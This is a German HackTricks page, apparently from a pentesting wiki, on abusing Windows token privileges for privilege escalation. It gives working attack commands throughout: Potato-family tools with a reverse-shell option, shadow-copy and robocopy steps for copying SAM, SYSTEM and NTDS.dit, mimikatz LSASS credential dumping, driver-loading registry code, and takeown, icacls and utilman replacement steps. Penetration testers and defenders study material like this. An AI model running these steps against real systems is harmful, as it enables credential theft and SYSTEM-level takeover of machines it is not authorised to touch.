# Tokens missbrauchen

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Wenn du **nicht weißt, was Windows Access Tokens sind**, lies diese Seite, bevor du fortfährst:


{{#ref}}
access-tokens.md
{{#endref}}

**Möglicherweise kannst du Privilegien eskalieren, indem du die bereits vorhandenen Tokens missbrauchst**

### SeImpersonatePrivilege

Dieses Privileg wird von jedem Prozess gehalten und ermöglicht die Impersonation (aber nicht die Erstellung) eines beliebigen Tokens, sofern ein Handle darauf erlangt werden kann. Ein privilegierter Token kann von einem Windows-Dienst (DCOM) erworben werden, indem dieser dazu gebracht wird, eine NTLM-Authentifizierung gegenüber einem Exploit durchzuführen, wodurch anschließend die Ausführung eines Prozesses mit SYSTEM-Privilegien ermöglicht wird.<sup>[[2]](#references)</sup> Diese Schwachstelle kann mit verschiedenen Tools ausgenutzt werden, beispielsweise [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (wobei winrm deaktiviert sein muss), [SweetPotato](https://github.com/CCob/SweetPotato) und [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Hinweise für moderne Operator:

- **JuicyPotato ist veraltet**: Verwende unter Windows 10 1809+/Server 2019+ vorzugsweise **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** oder **PrintSpoofer**, je nachdem, welche RPC/COM-Oberfläche noch erreichbar ist.
- Wenn du einen Dienst kompromittiert hast, der als **`LOCAL SERVICE`** oder **`NETWORK SERVICE`** ausgeführt wird, und `whoami /priv` ein **gefiltertes Token** ohne `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` anzeigt, stelle zuerst den **standardmäßigen Privilegienumfang** des Kontos wieder her (beispielsweise mit **FullPowers**) und versuche anschließend erneut die Potato-Familie.<sup>[[3]](#references)</sup>
- Einige neuere Forks sind für Operator benutzerfreundlicher als die ursprünglichen Tools. Beispielsweise fügt **SigmaPotato** Reflection/in-memory execution und Kompatibilität mit modernen Windows-Versionen hinzu, während **PrintNotifyPotato** den PrintNotify-COM-Dienst missbraucht und häufig nützlich ist, wenn der klassische Spooler-Pfad deaktiviert ist.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Es ist **SeImpersonatePrivilege** sehr ähnlich und verwendet die **gleiche Methode**, um ein privilegiertes Token zu erhalten.\
Dieses Privileg ermöglicht anschließend, **einem neuen oder angehaltenen Prozess ein primäres Token zuzuweisen**. Mit dem privilegierten Impersonation-Token kann ein primäres Token abgeleitet werden (DuplicateTokenEx).\
Mit diesem Token kann ein **neuer Prozess** mit 'CreateProcessAsUser' erstellt oder ein Prozess angehalten und **das Token gesetzt** werden (im Allgemeinen kann das primäre Token eines laufenden Prozesses nicht geändert werden).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Wenn dieses Token aktiviert ist, kann **KERB_S4U_LOGON** verwendet werden, um ohne Kenntnis der Anmeldedaten ein **Impersonation-Token** für jeden anderen Benutzer zu erhalten, **eine beliebige Gruppe** (Administratoren) zum Token hinzuzufügen, die **Integritätsstufe** des Tokens auf "**medium**" zu setzen und dieses Token dem **aktuellen Thread** zuzuweisen (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Durch dieses Privileg gewährt das System für jede Datei **vollständigen Lesezugriff** (auf Leseoperationen beschränkt). Es wird verwendet, um die **Passworthashes lokaler Administrator**-Konten aus der Registry auszulesen. Anschließend können Tools wie "**psexec**" oder "**wmiexec**" mit dem Hash verwendet werden (Pass-the-Hash technique). Diese Technik schlägt jedoch unter zwei Bedingungen fehl: wenn das lokale Administratorkonto deaktiviert ist oder wenn eine Richtlinie den lokalen Administratoren, die sich remote verbinden, die administrativen Rechte entzieht.<sup>[[2]](#references)</sup>\
In der Praxis ist der zuverlässigste integrierte Ablauf normalerweise **VSS + `robocopy /b`**: eine Schattenkopie erstellen und verfügbar machen, anschließend `SAM`/`SYSTEM` oder `NTDS.dit` im **Backup-Modus** kopieren, wodurch die Datei-ACLs umgangen werden.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Du kannst dieses **Privilege missbrauchen** mit:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- indem du **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec) folgst
- Oder wie im Abschnitt **escalating privileges with Backup Operators** erklärt:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Dieses Privilege gewährt **Schreibzugriff** auf jede Systemdatei, unabhängig von der Access Control List (ACL) der Datei. Dies eröffnet zahlreiche Möglichkeiten zur Privilege Escalation, einschließlich der Möglichkeit, **Services zu modifizieren**, DLL Hijacking durchzuführen und **Debugger** über Image File Execution Options zu setzen, neben zahlreichen weiteren Techniken.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege ist ein mächtiges Permission, das besonders nützlich ist, wenn ein Benutzer die Möglichkeit besitzt, Tokens zu impersonaten, aber auch wenn kein SeImpersonatePrivilege vorhanden ist. Diese Fähigkeit hängt von der Möglichkeit ab, ein Token zu impersonaten, das denselben Benutzer repräsentiert und dessen Integrity Level das des aktuellen Prozesses nicht überschreitet.<sup>[[2]](#references)</sup>

**Wichtige Punkte:**

- **Impersonation ohne SeImpersonatePrivilege:** Es ist möglich, SeCreateTokenPrivilege für EoP zu nutzen, indem unter bestimmten Bedingungen Tokens impersonated werden.
- **Bedingungen für die Token-Impersonation:** Eine erfolgreiche Impersonation erfordert, dass das Ziel-Token demselben Benutzer gehört und ein Integrity Level besitzt, das kleiner oder gleich dem Integrity Level des Prozesses ist, der die Impersonation durchführt.
- **Erstellung und Modifikation von Impersonation-Tokens:** Benutzer können ein Impersonation-Token erstellen und es durch Hinzufügen der SID (Security Identifier) einer privilegierten Gruppe erweitern.

### SeLoadDriverPrivilege

Dieses Privilege ermöglicht das **Laden und Entladen von Device Drivers**, indem ein Registry-Eintrag mit bestimmten Werten für `ImagePath` und `Type` erstellt wird. Da der direkte Schreibzugriff auf `HKLM` (HKEY_LOCAL_MACHINE) eingeschränkt ist, muss stattdessen `HKCU` (HKEY_CURRENT_USER) verwendet werden. Damit der Kernel `HKCU` jedoch für die Konfiguration von Drivers erkennen kann, muss ein bestimmter Pfad verwendet werden.<sup>[[2]](#references)</sup>

Die moderne offensive Nutzung ist normalerweise **BYOVD** (bring your own vulnerable driver): Einen **signierten, aber verwundbaren** Kernel Driver laden und anschließend dessen IOCTLs verwenden, um Protections zu deaktivieren oder zu Kernel-Codeausführung zu gelangen. Beachte, dass auf aktuellen Windows-11-/Server-Builds die **Microsoft vulnerable driver blocklist** und/oder **HVCI/Memory Integrity** ältere öffentliche Chains häufig verhindern. Daher sind klassische Beispiele im Stil von `szkg64.sys` nicht mehr universell zuverlässig.

Dieser Pfad lautet `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, wobei `<RID>` der Relative Identifier des aktuellen Benutzers ist. Innerhalb von `HKCU` muss dieser gesamte Pfad erstellt werden, und zwei Werte müssen gesetzt werden:<sup>[[2]](#references)</sup>

- `ImagePath`, der Pfad zu der auszuführenden Binary
- `Type` mit dem Wert `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Vorgehensweise:**

1. Aufgrund des eingeschränkten Schreibzugriffs `HKCU` anstelle von `HKLM` verwenden.
2. Den Pfad `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` innerhalb von `HKCU` erstellen, wobei `<RID>` den Relative Identifier des aktuellen Benutzers darstellt.
3. `ImagePath` auf den Ausführungspfad der Binary setzen.
4. `Type` auf `SERVICE_KERNEL_DRIVER` (`0x00000001`) setzen.
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Weitere Möglichkeiten, dieses Privileg zu missbrauchen, finden Sie unter [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Dies ähnelt **SeRestorePrivilege**. Seine primäre Funktion ermöglicht es einem Prozess, **die Besitzrechte an einem Objekt zu übernehmen**, wobei die Anforderung eines expliziten diskretionären Zugriffs durch die Gewährung von WRITE_OWNER-Zugriffsrechten umgangen wird. Der Vorgang besteht zunächst darin, den Besitz des vorgesehenen Registry-Schlüssels für Schreibvorgänge zu übernehmen und anschließend die DACL zu ändern, um Schreibvorgänge zu ermöglichen.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Dieses Privileg ermöglicht das **Debuggen anderer Prozesse**, einschließlich des Lesens und Schreibens in deren Speicher. Mit diesem Privileg können verschiedene Strategien zur Memory Injection eingesetzt werden, die die meisten Antivirus- und Host-Intrusion-Prevention-Lösungen umgehen können.<sup>[[2]](#references)</sup>

Denke bei modernen Windows-Versionen daran, dass `SeDebugPrivilege` normalerweise ausreicht, um **nicht geschützte SYSTEM-Prozesse** zu öffnen und deren Token zu duplizieren. Es garantiert jedoch **nicht**, dass du auf **LSASS** zugreifen kannst. Wenn **RunAsPPL / LSA Protection** aktiviert ist, können nicht geschützte Prozesse LSASS weder lesen noch injizieren, selbst wenn `SeDebugPrivilege` vorhanden ist. Stehle in diesem Fall ein Token von einem anderen nicht durch PPL geschützten SYSTEM-Prozess oder kombiniere dies mit einem PPL-Bypass/BYOVD, anstatt davon auszugehen, dass `procdump` funktioniert. Ein vollständiges Beispiel zum Kopieren eines Tokens mit `SeDebugPrivilege` + `SeImpersonatePrivilege` findest du auf [dieser Seite](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Du kannst [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) aus der [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) verwenden, um **den Speicher eines Prozesses zu erfassen**. Dies kann insbesondere auf den Prozess **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** angewendet werden, der dafür verantwortlich ist, Benutzer-Credentials zu speichern, sobald sich ein Benutzer erfolgreich an einem System angemeldet hat.

Anschließend kannst du diesen Dump in mimikatz laden, um Passwörter zu erhalten:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Wenn du eine `NT SYSTEM`-Shell erhalten möchtest, kannst du Folgendes verwenden:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Dieses Recht (Perform volume maintenance tasks) ermöglicht das Öffnen von Raw-Volume-Device-Handles (z. B. \\.\C:) für direkten Disk-I/O, der NTFS-ACLs umgeht. Damit können die Bytes jeder Datei auf dem Volume durch Lesen der zugrunde liegenden Blöcke kopiert werden, wodurch beliebiges Lesen von Dateien mit sensiblen Inhalten möglich wird (z. B. private Maschinenschlüssel in %ProgramData%\Microsoft\Crypto\, Registry-Hives, SAM/NTDS über VSS).<sup>[[5]](#references)</sup> Besonders wirkungsvoll ist dies auf CA-Servern, da das Exfiltrieren des privaten CA-Schlüssels das Fälschen eines Golden Certificate ermöglicht, um sich als beliebiger Principal auszugeben.<sup>[[6]](#references)</sup>

Detaillierte Techniken und Mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Privilegien prüfen
```
whoami /priv
```
Die **Tokens, die als Disabled angezeigt werden**, können normalerweise aktiviert werden, sodass du häufig sowohl _Enabled_- als auch _Disabled_-Berechtigungen missbrauchen kannst.

### Alle Tokens aktivieren

Wenn du deaktivierte Berechtigungen hast, kannst du das Skript [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) verwenden, um alle Tokens zu aktivieren:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Oder das in diesem [**Post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) eingebettete **Skript**.

## Tabelle

Vollständiger Cheatsheet zu Token-Privilegien unter [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); die folgende Zusammenfassung listet nur direkte Möglichkeiten auf, das Privileg auszunutzen, um eine Admin-Sitzung zu erhalten oder vertrauliche Dateien zu lesen.<sup>[[1]](#references)</sup>

| Privileg                  | Auswirkung      | Tool                    | Ausführungspfad                                                                                                                                                                                                                                                                                                                                     | Anmerkungen                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | --------------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"Es würde einem Benutzer ermöglichen, Tokens zu impersonifizieren und mit Tools wie potato.exe, rottenpotato.exe und juicypotato.exe zu NT System zu eskalieren"_                                                                                                                                                                              | Danke an [Aurélien Chalot](https://twitter.com/Defte_) für die Aktualisierung. Ich werde versuchen, dies bald in eine stärker rezeptartige Formulierung umzuschreiben.                                                                                                                                                                                         |
| **`SeBackup`**             | **Bedrohung**  | _**Integrierte Befehle**_ | Vertrauliche Dateien mit `robocopy /b` oder speziellen, SeBackup-fähigen Copy-Helpern lesen.                                                                                                                                                                                                                                                        | <p>- Besonders geeignet für `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` und manchmal `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` ist praktisch, aber spezielle SeBackup-Cmdlets/APIs sind für gesperrte oder geöffnete Dateien oft flexibler.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Mit `NtCreateToken` ein beliebiges Token einschließlich lokaler Admin-Rechte erstellen.                                                                                                                                                                                                                                                             |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Ein **nicht-PPL**-SYSTEM-Token duplizieren oder den Speicher eines nicht geschützten Prozesses dumpen.                                                                                                                                                                                                                                             | <p>Das Dumpen von LSASS wird üblicherweise blockiert, wenn RunAsPPL/LSA Protection aktiviert ist.</p><p>Das Skript ist bei [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) zu finden.</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Die **Potato family** / Named-Pipe-Impersonation verwenden, um SYSTEM zu starten (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` usw.).                                                                                                                                                                          | <p>Am praktischsten bei Service-Accounts wie IIS APPPOOL, MSSQL, geplanten Tasks oder jedem Kontext, der bereits `SeImpersonatePrivilege` besitzt.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Einen signierten, aber verwundbaren Kernel-Treiber (BYOVD) laden<br>2. Die IOCTLs des Treibers verwenden, um Kernel-R/W zu erhalten, Security-Tools zu deaktivieren oder zu SYSTEM zu eskalieren<br><br>Alternativ kann das Privileg verwendet werden, um sicherheitsrelevante Treiber mit dem integrierten Befehl <code>fltMC</code> zu entladen, z. B. mit <code>fltMC sysmondrv</code></p>                     | <p>Ältere öffentliche Treiber wie <code>szkg64.sys</code> werden unter modernen Windows-Versionen zunehmend durch die Vulnerable-Driver-Blocklist / HVCI blockiert.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. PowerShell/ISE mit vorhandenem SeRestore-Privileg starten.<br>2. Das Privileg mit <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>) aktivieren.<br>3. utilman.exe in utilman.old umbenennen<br>4. cmd.exe in utilman.exe umbenennen<br>5. Die Konsole sperren und Win+U drücken</p> | <p>Der Angriff kann von mancher AV-Software erkannt werden.</p><p>Eine alternative Methode beruht darauf, mit demselben Privileg Service-Binaries zu ersetzen, die in "Program Files" gespeichert sind.</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Integrierte Befehle**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe in utilman.exe umbenennen<br>4. Die Konsole sperren und Win+U drücken</p>                                                                                                                                       | <p>Der Angriff kann von mancher AV-Software erkannt werden.</p><p>Eine alternative Methode beruht darauf, mit demselben Privileg Service-Binaries zu ersetzen, die in "Program Files" gespeichert sind.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Tokens so manipulieren, dass lokale Admin-Rechte enthalten sind. SeImpersonate kann erforderlich sein.</p><p>Noch zu verifizieren.</p>                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |

## Referenzen

- [1] [gtworek/Priv2Admin – Ausnutzungspfade von Windows-Privilegien zu Admin](https://github.com/gtworek/Priv2Admin)
- [2] [Token-Privilegien für LPE missbrauchen](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Gebt mir meine Privilegien zurück! Bitte?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (der `/b`-Backup-Modus umgeht ACL-Prüfungen für Dateien/Ordner)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Volumewartungsaufgaben durchführen (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA-Key-Exfiltration → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
